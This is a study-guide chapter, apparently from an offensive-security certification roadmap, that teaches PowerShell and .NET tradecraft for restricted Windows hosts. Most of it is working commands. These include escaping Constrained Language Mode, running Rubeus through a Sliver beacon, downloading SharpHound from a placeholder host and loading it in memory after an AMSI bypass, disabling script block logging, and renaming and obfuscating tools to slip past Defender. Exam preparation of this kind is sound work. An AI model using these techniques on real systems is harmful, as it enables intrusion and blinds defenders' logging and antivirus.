# Phase 16: PowerShell & .NET Tradecraft

> **Why**: The exam explicitly tests PowerShell in restricted environments. This phase builds confidence operating when CLM, AppLocker, or JEA block your standard tools.

**Study time**: 1 week | **Difficulty**: Advanced

---

## 1. Constrained Language Mode (CLM)

```powershell
# Check your language mode
$ExecutionContext.SessionState.LanguageMode
# ConstrainedLanguage = restricted

# What's blocked in CLM:
# - Add-Type, custom classes, most .NET calls
# - Arbitrary COM objects
# What still works: basic cmdlets, Get-*, pipeline, strings
```

### CLM Bypass Methods

```powershell
# Method 1: PowerShell v2 downgrade (if installed)
powershell -version 2
$ExecutionContext.SessionState.LanguageMode  # often FullLanguage

# Method 2: Use execute-assembly via C2 (bypasses PS entirely)
sliver (beacon) > execute-assembly ~/tools/Rubeus.exe kerberoast /nowrap

# Method 3: Invoke a .NET binary that calls PowerShell
# PowerShdll — runs PowerShell from inside rundll32
rundll32 PowerShdll.dll,main
```

---

## 2. Loading .NET In-Memory

```powershell
# After AMSI bypass:
# Load any .NET assembly without touching disk
$bytes = (New-Object Net.WebClient).DownloadData('http://<ip>/SharpHound.exe')
[System.Reflection.Assembly]::Load($bytes)
[SharpHound.Program]::Main("-c All --zip".Split())

# WHY Assembly.Load works: .NET's reflection API allows loading assemblies from bytes.
# The assembly runs in the current process. No disk write.
# The AMSI bypass must happen BEFORE this — or AMSI scans the assembly bytes.
```

---

## 3. Bypassing Transcription Logging

```powershell
# Disable Script Block Logging (needs admin)
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" \
  -Name "EnableScriptBlockLogging" -Value 0

# Invisi-Shell disables both AMSI and transcription in one step:
.\RunWithRegistryNonAdmin.bat
# Then all PS commands in this session are unlogged
```

---

## 4. Offensive .NET — Modifying Tools

When a tool is caught by Defender after static scan:

```bash
# Step 1: Download the source code
git clone https://github.com/BloodHoundAD/SharpHound

# Step 2: Change identifying strings (namespace, class names, output strings)
# In Visual Studio / VS Code: find/replace "SharpHound" → "WinService"
# Change AssemblyInfo: company, product name, description

# Step 3: Recompile
dotnet build -c Release

# Step 4: Test against Defender
.\ThreatCheck.exe -f SharpHound_modified.exe

# Step 5: If still caught → ConfuserEx obfuscation
# Load project in ConfuserEx, enable: rename, ctrl flow, anti-tamper
# Compile with protection → usually bypasses remaining signatures
```

---

## Practice Labs

| Lab | Platform | Focus |
|-----|---------|-------|
| [THM: Bypassing Security with CLM](https://tryhackme.com/room/pshell) | THM (Free) | PS in restricted envs |
| [THM: Abusing Windows Internals](https://tryhackme.com/room/abusingwindowsinternals) | THM (Sub) | .NET reflection, loaders |

---

## Phase 16 Mastery Checklist

- [ ] Can you detect CLM and bypass it with at least 2 methods?
- [ ] Can you load a .NET assembly in-memory after AMSI bypass?
- [ ] Can you modify and recompile SharpHound to bypass a Defender signature?
- [ ] Can you disable PowerShell transcription logging?

---

## Next Phase → **Phase 17: Full Chain Simulation**
